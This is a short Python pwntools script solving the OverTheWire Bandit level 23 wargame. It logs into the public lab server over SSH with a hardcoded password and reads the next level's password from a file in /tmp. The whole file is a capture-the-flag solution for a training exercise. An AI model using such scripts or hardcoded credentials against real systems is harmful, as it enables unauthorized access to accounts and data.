#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit23 exploit by SKane')

shell = ssh('bandit23', 'bandit.labs.overthewire.org', password='jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n', port=2220)

sh = shell.run('sh')

sh.sendline('cat /tmp/secttp/password')

log.success("Password for bandit24: " + sh.recvline())
